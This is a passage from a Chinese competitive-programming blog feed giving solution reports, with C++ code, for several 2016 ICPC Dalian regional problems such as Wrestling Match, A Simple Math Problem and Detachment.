class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">100010</span>;</div><div class="line"><span class="keyword">long</span> <span class="keyword">long</span> a[N];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> T,n;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%lld"</span>,&amp;a[i]);</div><div class="line">        &#125;</div><div class="line">        ll ans=<span class="number">-1</span>;</div><div class="line">        <span class="keyword">int</span> pre=n;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;<span class="number">0</span>;i--) &#123;</div><div class="line">            ans=max(ans,a[i]+a[pre]+pre-i);</div><div class="line">            <span class="keyword">if</span> (a[i]+i&gt;a[pre]+pre) pre=i;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,ans);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>终于可以假装自己AK了，over~</p><h3 id="Coda"><a href="#Coda" class="headerlink" title="Coda"></a>Coda</h3><p>看到其他学校搞的比赛，不得不说比我们正式正规的多。。。<br>不过有底气邀请全国的我们也不说了 =。= 话说那天给的网址是日本的服务器然后现在已经登不了了。。。FJNU 可以的，很66666</p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2016 ICPC 大连站解题报告</title>
      <url>/blog/2016/11/06/2016-icpc-dalian/</url>
      <content type="html"><![CDATA[<h3 id="J-Find-Small-A"><a href="#J-Find-Small-A" class="headerlink" title="J. Find Small A"></a><a href="http://acm.hdu.edu.cn/showproblem.php?pid=5980" target="_blank" rel="noopener">J. Find Small A</a></h3><p>一眼题<del>没看清以为移4位WA了一次</del></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n)!=EOF) &#123;</div><div class="line">        <span class="keyword">int</span> ans=<span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="keyword">int</span> x;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;x);</div><div class="line">            <span class="keyword">while</span> (x) &#123;</div><div class="line">                ans+=((x&amp;<span class="number">255</span>)==<span class="string">'a'</span>);</div><div class="line">                x&gt;&gt;=<span class="number">8</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,ans);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="H-To-begin-or-not-to-begin"><a href="#H-To-begin-or-not-to-begin" class="headerlink" title="H. To begin or not to begin"></a><a href="http://acm.hdu.edu.cn/showproblem.php?pid=5978" target="_blank" rel="noopener">H. To begin or not to begin</a></h3><p>简单计算或者由生活常识：每次抽中红球的概率都是相等的，所以只需要判断先后手抽的次数，也就是判断奇偶性。这里题目没说k是什么，但是看样例应该差不多<del>反正先随便交一发</del>【据说当时pc^2上还给了错误的解释。。。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n)!=EOF) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,(n+<span class="number">1</span>)&amp;<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h3 id="I-Convex"><a href="#I-Convex" class="headerlink" title="I. Convex"></a><a href="http://acm.hdu.edu.cn/showproblem.php?pid=5979" target="_blank" rel="noopener">I. Convex</a></h3><p>正弦面积公式，注意角度弧度转换<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">double</span> PI=<span class="built_in">acos</span>(<span class="number">-1.0</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n,r;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;r)!=EOF) &#123;</div><div class="line">        <span class="keyword">long</span> <span class="keyword">double</span> ans=<span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="keyword">int</span> a;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a);</div><div class="line">            ans+=<span class="built_in">sin</span>(a/<span class="number">180.0</span>*PI)*r*r;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">double</span> outter=ans/<span class="number">2.0</span>;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%.3f\n"</span>,outter);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h3 id="D-A-Simple-Math-Problem"><a href="#D-A-Simple-Math-Problem" class="headerlink" title="D. A Simple Math Problem"></a><a href="http://acm.hdu.edu.cn/showproblem.php?pid=5974" target="_blank" rel="noopener">D. A Simple Math Problem</a></h3><p>比较 $simple$ ，看到 $LCM$ 想到 $GCD$ 。<br>原题即为$$(p,q)=1$$$$pg+qg=a$$$$pqg=b$$<br>可以发现必须有 $g=(a,b)$ 。最后输出 $pg,qg$ 即可。<br>交上去发现只有我 OLE，结果是忘记打 <code>!=EOF</code> 了。。。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"></div><div class="line"><span class="function">ll <span class="title">gcd</span><span class="params">(ll a,ll b)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (!b) <span class="keyword">return</span> a;</div><div class="line">    <span class="keyword">return</span> gcd(b,a%b);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    ll a,b;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%lld%lld"</span>,&amp;a,&amp;b)!=EOF) &#123;</div><div class="line">        ll g=gcd(a,b);</div><div class="line">        a/=g;b/=g;</div><div class="line">        ll tmp=a*a<span class="number">-4</span>*b;</div><div class="line">        <span class="keyword">if</span> (tmp&lt;<span class="number">0</span>) &#123;</div><div class="line">            <span class="built_in">puts</span>(<span class="string">"No Solution"</span>);</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">        ll x=<span class="built_in">sqrt</span>(tmp);</div><div class="line">        <span class="keyword">if</span> (x*x!=tmp) &#123;</div><div class="line">            <span class="built_in">puts</span>(<span class="string">"No Solution"</span>);</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> ((a+x)&amp;<span class="number">1</span>||a&lt;=x) &#123;</div><div class="line">            <span class="built_in">puts</span>(<span class="string">"No Solution"</span>);</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">        ll p=(a+x)/<span class="number">2</span>*g;</div><div class="line">        ll q=(a-x)/<span class="number">2</span>*g;</div><div class="line">        <span class="keyword">if</span> (p&gt;q) swap(p,q);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%lld %lld\n"</span>,p,q);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h3 id="A-Wrestling-Match"><a href="#A-Wrestling-Match" class="headerlink" title="A. Wrestling Match"></a><a href="http://acm.hdu.edu.cn/showproblem.php?pid=5971" target="_blank" rel="noopener">A. Wrestling Match</a></h3><p>其实我先写的 A 。。。但是写到一半感觉有点写不下去又看到 D 比较 simple 就去搞 D 了。。。简单的说就是从所给的已知好坏的点开始搜索。。。这些点搜索完了再搜索剩下的点。。。如果某个点不是已知点，并且不与其他点连边，那么它无法被分类。。。听说很多人卡题意卡了半天。。。我觉得我也说不出来准确的题意= =。。。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">1010</span>;</div><div class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; eg[N];</div><div class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; good,bad;</div><div class="line"><span class="keyword">int</span> col[N];</div><div class="line"><span class="keyword">int</span> n,m;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">bfs</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> c)</span></span></div><div class="line">&#123;</div><div class="line">    col[x]=c;</div><div class="line">    <span class="built_in">queue</span>&lt;<span class="keyword">int</span>&gt; Q;</div><div class="line">    Q.push(x);</div><div class="line">    <span class="keyword">while</span> (!Q.empty()) &#123;</div><div class="line">        <span class="keyword">int</span> u=Q.front();</div><div class="line">        Q.pop();</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;eg[u].size();i++) &#123;</div><div class="line">            <span class="keyword">int</span> &amp;v=eg[u][i];</div><div class="line">            <span class="keyword">if</span> (col[v]==<span class="number">-1</span>) &#123;</div><div class="line">                col[v]=col[u]^<span class="number">1</span>;</div><div class="line">                Q.push(v);</div><div class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (col[v]==col[u]) &#123;</div><div class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;m)!=EOF) &#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            eg[i].clear();</div><div class="line">        &#125;</div><div class="line">        good.clear();</div><div class="line">        bad.clear();</div><div class="line">        <span class="keyword">int</span> x,y;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;x,&amp;y);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++) &#123;</div><div class="line">            <span class="keyword">int</span> u,v;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;u,&amp;v);</div><div class="line">            eg[u].push_back(v);</div><div class="line">            eg[v].push_back(u);</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">memset</span>(col,<span class="number">0xff</span>,<span class="keyword">sizeof</span>(col));</div><div class="line">        </div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;x;i++) &#123;</div><div class="line">            <span class="keyword">int</span> k;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;k);</div><div class="line">            col[k]=<span class="number">1</span>;</div><div class="line">            good.push_back(k);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;y;i++) &#123;</div><div class="line">            <span class="keyword">int</span> k;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;k);</div><div class="line">            col[k]=<span class="number">0</span>;</div><div class="line">            bad.push_back(k);</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">        <span class="keyword">int</span> f=<span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;x;i++) &#123;</div><div class="line">            <span class="keyword">if</span> (!bfs(good[i],<span class="number">1</span>)) &#123;</div><div class="line">                f=<span class="number">1</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (f) &#123;</div><div class="line">            <span class="built_in">puts</span>(<span class="string">"NO"</span>);</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;y;i++) &#123;</div><div class="line">            <span class="keyword">if</span> (!bfs(bad[i],<span class="number">0</span>)) &#123;</div><div class="line">                f=<span class="number">1</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (f) &#123;</div><div class="line">            <span class="built_in">puts</span>(<span class="string">"NO"</span>);</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="keyword">if</span> (col[i]==<span class="number">-1</span>) &#123;</div><div class="line">                <span class="keyword">if</span> (eg[i].size()==<span class="number">0</span>) &#123;</div><div class="line">                    f=<span class="number">1</span>;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">if</span> (!bfs(i,<span class="number">0</span>)) &#123;</div><div class="line">                    f=<span class="number">1</span>;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (f) <span class="built_in">puts</span>(<span class="string">"NO"</span>);</div><div class="line">        <span class="keyword">else</span> <span class="built_in">puts</span>(<span class="string">"YES"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>然后不知道搞啥。。。咸鱼了挺久。。。</p><h3 id="E-Aninteresting-game"><a href="#E-Aninteresting-game" class="headerlink" title="E. Aninteresting game"></a><a href="http://acm.hdu.edu.cn/showproblem.php?pid=5975" target="_blank" rel="noopener">E. Aninteresting game</a></h3><p>终于把E读懂感觉这不是sb题吗。。。题解重点讲的询问1一遍写对，询问2倒是想错了好多次。。。 OTZ<br>询问1 其实就是求 $\sum_{i=l}^{r} lowbit(i)$ 只要枚举 $lowbit$ 的值就行了。。。不过每次要把上一次重复的去掉一些。。。<br>询问2 我想的是可以把除了最后一段 0 的其它 0 的位置填成 1（见 Method One） 。。。不过这个操作建议看题解，写得更清晰，而且只用到了 $lowbit$ （见 Method Two）。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    ll n,q;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%lld%lld"</span>,&amp;n,&amp;q)!=EOF) &#123;</div><div class="line">        <span class="keyword">while</span> (q--) &#123;</div><div class="line">            <span class="keyword">int</span> op;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;op);</div><div class="line">            <span class="keyword">if</span> (op==<span class="number">1</span>) &#123;</div><div class="line">                ll l,r;</div><div class="line">                <span class="built_in">scanf</span>(<span class="string">"%lld%lld"</span>,&amp;l,&amp;r);</div><div class="line">                ll ans=<span class="number">0</span>,weigh=<span class="number">1</span>;</div><div class="line">                <span class="keyword">while</span> (weigh&lt;=r) &#123;</div><div class="line">                    ll tmp=r/weigh-(l<span class="number">-1</span>)/weigh;</div><div class="line">                    <span class="keyword">if</span> (tmp==<span class="number">0</span>) <span class="keyword">break</span>;</div><div class="line">                    ans-=tmp*(weigh&gt;&gt;<span class="number">1</span>);</div><div class="line">                    ans+=tmp*weigh;</div><div class="line"><span class="comment">//                    printf("TMP: %lld\nANS: %lld\n",tmp,ans);</span></div><div class="line">                    weigh&lt;&lt;=<span class="number">1</span>;</div><div class="line">                &#125;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,ans);</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                ll x,ans=<span class="number">0</span>;</div><div class="line">                <span class="built_in">scanf</span>(<span class="string">"%lld"</span>,&amp;x);</div><div class="line">                </div><div class="line">                <span class="comment">/***Method One***/</span></div><div class="line">                <span class="keyword">int</span> k=<span class="number">0</span>;</div><div class="line">                <span class="keyword">while</span> (((x&gt;&gt;k)&amp;<span class="number">1</span>)==<span class="number">0</span>) k++;</div><div class="line">                <span class="keyword">for</span> (;;k++) &#123;</div><div class="line">                    <span class="keyword">if</span> (((x&gt;&gt;k)&amp;<span class="number">1</span>)==<span class="number">0</span>) &#123;</div><div class="line">                        <span class="keyword">if</span> ((((x&gt;&gt;k)^<span class="number">1</span>)&lt;&lt;k)&lt;=n) ans++;</div><div class="line">                        <span class="keyword">else</span> <span class="keyword">break</span>;</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,ans+<span class="number">1</span>);</div><div class="line">                <span class="comment">/***Method One***/</span></div><div class="line">                </div><div class="line">                <span class="comment">/***Method Two***/</span></div><div class="line"><span class="comment">//                while (x&lt;=n) &#123;</span></div><div class="line"><span class="comment">//                    ans++;</span></div><div class="line"><span class="comment">//                    x+=x&amp;(-x);</span></div><div class="line"><span class="comment">//                &#125;</span></div><div class="line"><span class="comment">//                printf("%lld\n",ans);</span></div><div class="line">                <span class="comment">/***Method Two***/</span></div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h3 id="F-Detachment"><a href="#F-Detachment" class="headerlink" title="F. Detachment"></a><a href="http://acm.hdu.edu.cn/showproblem.php?pid=5976" target="_blank" rel="noopener">F. Detachment</a></h3><p>想得不怎么清楚。。。天猫教我的。。。<br>肯定从小的开始乘，这个还是比较显然的，所以刚开始先生成 $2\times 3\times……\times k$ ，多出来一个小于 $k+1$ 的数，这时可以从后往前把一段数 +1 